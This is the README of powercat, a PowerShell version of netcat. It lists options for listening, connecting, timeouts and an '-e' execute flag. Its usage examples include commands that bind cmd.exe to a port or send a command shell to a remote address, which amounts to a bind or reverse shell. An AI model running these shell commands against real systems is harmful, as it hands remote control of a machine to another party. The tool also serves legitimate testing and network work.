#powercat

Netcat: The powershell version. (v2 compatible)

### Parameters:
    -l    Listen for a connection.                    [Switch]
    -c    Connect to a listener.                      [String]
    -p    The port to connect to, or listen on.       [String]
    -e    GAPING_SECURITY_HOLE                        [String]
    -t    Timeout option. Default: 60                 [int32]
### Usage Examples:
    powercat -l 443
    powercat -l -e cmd.exe 443
    powercat -c 10.1.1.10 443
    powercat -c 10.1.1.10 -e cmd.exe 443
### Stuff that Doesn't Work (Yet):
    Output redirection. (powercat -l 443 > C:\outfile)
    Accepting pipeline input. (cat infile | powercat -c 10.1.1.1 443)
